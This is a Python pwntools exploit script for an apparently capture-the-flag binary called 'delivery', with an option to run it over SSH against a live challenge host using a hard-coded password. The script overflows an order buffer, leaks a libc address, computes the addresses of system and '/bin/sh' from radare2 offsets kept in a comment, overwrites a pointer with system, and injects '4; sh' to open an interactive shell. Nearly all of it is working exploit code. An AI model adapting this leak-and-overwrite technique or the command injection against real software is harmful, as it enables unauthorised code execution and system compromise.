#!/usr/bin/env python
from pwn import *

p = process(['./delivery4_f62a7f48d634f6a8fc83df2473907d4162a2af08']) if '--live' not in sys.argv else process(['sshpass', '-p', 'delivery', 'ssh', 'delivery@delivery.as.a.service.marcusmadisonbakery.ctf'])

def force_flush():
    '''
    The delivery binary doesn't flush its stdout, this is a hacky 
    workaround that 'plunges' the buffer until data is visible.
    '''
    buf = []
    s = 'Invalid option.'
    tmp = None
    while True:
        tmp = p.recvuntil([s], timeout=.001)
        if s in tmp:
            buf.append(tmp)
            break
        #print('test')
        p.sendline('')
    oldtmp = None
    while True:
        tmp = p.recvuntil([s], timeout=.001)
        buf.append(tmp)
        if s not in tmp:
            return buf
        oldtmp = tmp

for i in range(0,101):
    p.sendline('3')
    p.sendline(str(i+1))
    p.sendline('A'*4)
    tmp = force_flush()
    #print(repr(tmp[0]))
    if i % 10 == 0:
        print(i)

padding = 'A'*8*2+'B'*4
#padding = 'A'*8*3

p.sendline('3')
p.sendline(str(102))
p.sendline(padding)
p.sendline('1')

#gdb.attach(p)
#0x0000000000400b13 : pop rdi ; ret
'''
[0x000c1745]> f~start_main
0x00021dd0 447 sym.__libc_start_main
[0x000c1745]> f~sym.system
0x00046640 45 sym.system
[0x000c1745]> f~str._bin
0x0017ccdb 8 str._bin_sh
0x0017e58f 14 str._bin:_usr_bin
0x0017ea69 9 str._bin_csh
'''

#tmp = force_flush()
#print(repr(tmp))
#print(repr(tmp[0]))

p.sendline('1')
has_libcleak = force_flush()
print(repr(has_libcleak[0]))

libc_start_main = int(re.findall('Order no: 102\n-*\nAAAAAAAAAAAAAAAABBBB([^\n]*)\n', has_libcleak[0])[0][::-1].encode('hex'), 16)
libc_base = libc_start_main - (0x00021dd0 + 245)
libc_system = libc_base + 0x00046640
libc_binsh = libc_base + 0x0017ccdb

print('libc_system: 0x%x' % (libc_system,))

p.sendline('3')
p.sendline(str(102))
ropchain = padding + p64(libc_system)
p.sendline(ropchain)
p.sendline('4; sh')

p.interactive()
